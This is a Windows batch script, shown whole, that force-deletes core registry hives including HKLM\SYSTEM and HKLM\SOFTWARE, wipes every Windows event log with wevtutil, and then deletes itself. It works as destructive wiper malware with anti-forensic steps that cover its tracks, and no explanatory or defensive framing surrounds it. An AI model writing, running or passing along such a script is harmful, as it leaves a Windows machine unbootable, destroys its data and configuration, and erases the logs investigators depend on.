@ECHO OFF
REG DELETE HKEY_CURRENT_CONFIG\System /f
REG DELETE HKEY_CURRENT_CONFIG\Software /f
REG DELETE HKEY_LOCAL_MACHINE\SYSTEM /f
REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE /f
for /F “tokens=*” %1 in ('wevtutil.exe el') DO wevtutil.exe cl “%1”
(goto) 2>nul & del "%~f0"